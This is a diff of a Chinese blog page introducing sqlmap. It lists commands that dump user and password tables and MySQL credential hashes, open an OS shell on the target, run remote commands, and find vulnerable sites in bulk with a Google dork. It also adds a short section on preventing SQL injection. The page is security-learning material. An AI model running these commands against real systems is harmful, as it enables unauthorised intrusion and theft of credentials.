@@ -7,7 +7,7 @@
     <meta name="keywords" content="Sqmap Simple Intro, lithiumice huaring cquer github blog">
     <meta name="baidu-site-verification" content>
     <meta name="google-site-verification" content>
-    <meta name="description" content="常用命令12345678./sqlmap.py -u &#34;http://localhost:88/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&#34; –cookie=mycookice.txt –ba">
+    <meta name="description" content="常用命令./sqlmap.py -u &amp;quot;http://localhost:88/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&amp;quot; –cookie=mycookice.txt –">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -370,14 +370,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    276
+                    569
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
                 
@@ -393,11 +393,18 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://localhost:88/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> –cookie=mycookice<span class="selector-class">.txt</span> –batch</span><br><span class="line">./sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar"</span> –batch -D sql_inject_demo -T t_user –<span class="attribute">columns</span></span><br><span class="line">./sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar"</span> –batch -D sql_inject_demo -T t_user -C ‘username, passwd’ –dump</span><br><span class="line">./sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar"</span> –batch -D mysql -T user -C ‘user, authentication_string’ –dump</span><br><span class="line">./sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> –os-shell <span class="comment">// 获取远程主机的shell</span></span><br><span class="line">./sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> –os-cmd=<span class="string">"whoami"</span> <span class="comment">// 执行远程主机的命令</span></span><br><span class="line">./sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://127.0.0.1/index.php?id=1"</span> –is-dba <span class="comment">// 检查DBMS用户是否为DBA</span></span><br><span class="line">./sqlmap<span class="selector-class">.py</span> -g <span class="string">"inurl:php?id="</span> <span class="comment">// 通过google寻找url带有php?id=字段的地址</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>参数解析</strong><br>–batch –dbs //showdatabases<br>–batch –current-db //showcurrentdb<br>–batch -D database -T user -C varchar–tables //showtables<br>–columns //showcolumns<br>–tables //thesame</p>
+                <h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre><code>./sqlmap.py -u &quot;http://localhost:88/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie=mycookice.txt –batch
+./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D sql_inject_demo -T t_user –columns
+./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D sql_inject_demo -T t_user -C ‘username, passwd’ –dump
+./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D mysql -T user -C ‘user, authentication_string’ –dump
+./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –os-shell // 获取远程主机的shell
+./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –os-cmd=&quot;whoami&quot; // 执行远程主机的命令
+./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –is-dba // 检查DBMS用户是否为DBA
+./sqlmap.py -g &quot;inurl:php?id=&quot; // 通过google寻找url带有php?id=字段的地址</code></pre><p><strong>参数解析</strong><br>–batch –dbs //showdatabases<br>–batch –current-db //showcurrentdb<br>–batch -D database -T user -C varchar–tables //showtables<br>–columns //showcolumns<br>–tables //thesame<br>–dump //查询出所有数据表的所有数据</p>
 <p><strong>以GET方式的cookice形式:</strong><br>_ga=GA1.1.1240902680.1567156892; portainer.datatable_text_filter_home_endpoints=; PHPSESSID=r56dp5dsqrc9rmjq74k85m4jd1; security=low</p>
 <p><strong>POST注入方式:</strong><br>$ python sqlmap.py -r header.txt –dbs<br>// -r是从一个文件中载入HTTP请求<br>// 其余都与GET一样将-u部分改成-r header.txt<br>从chrome保存下来的request header:<br>POST /index.php HTTP/1.1 …</p>
+<p>sqlmap.py -u “url” –cookie=”” –data=“post源码” –batch –smart启发式判断<br>批量检测注入漏洞<br>sqlmap.py -g “url匹配” –batch –smart<br>sqlmap.py -l txt文件名 –batch –smart</p>
+<h2 id="防护sql注入"><a href="#防护sql注入" class="headerlink" title="防护sql注入"></a>防护sql注入</h2><p>那么，如何防护sql的注入呢<br>（1）永远不要相信用户的输入，必须对用户的输入进行校验，过滤，可以通过正则表达式，输入的字符长度限制但双引号，转义字符等，可以前后端进行结合对用户的输入验证<br>（2）重要的数据等不能明文显示，必须加密<br>（3）不要用管理员的权限登录数据库，可以在数据库的安全性文件夹-架构-新建架构，然后在数据表上添加架构的名称，查询数据表时需要在表明前面加上架构的前缀才能查询，这样有效防止对数据表名的猜测。<br>（4）对于系统的错误提示尽可能少，或者对其提示进行改变，隐藏不必要的系统信息。</p>
 
             </div>
             <hr />
@@ -475,7 +482,7 @@ gitment.render('gitment-content');
                         
                             test flarumgithub
 1.install composer:composer create-project flarum/flarum . --stability=beta2.in order to use php
-1234s
+sudo 
                         
                     </div>
                     <div class="publish-info">
@@ -509,7 +516,10 @@ gitment.render('gitment-content');
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            先卸载系统的node12345678sudo rm /usr/local/bin/npmsudo rm /usr/local/share/man/man1/node.1sudo rm /usr/local/lib/dtrace/node.d
+                            先卸载系统的nodesudo rm /usr/local/bin/npm
+sudo rm /usr/local/share/man/man1/node.1
+sudo rm /usr/local/lib/dtrace/node.d
+sudo 
                         
                     </div>
                     <div class="publish-info">
@@ -678,7 +688,7 @@ gitment.render('gitment-content');
             &copy; 2019 lithiumice | huaring. All rights reserved.
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">4.9k</span>
+            <span class="white-color">6.6k</span>
             
 
             <br>
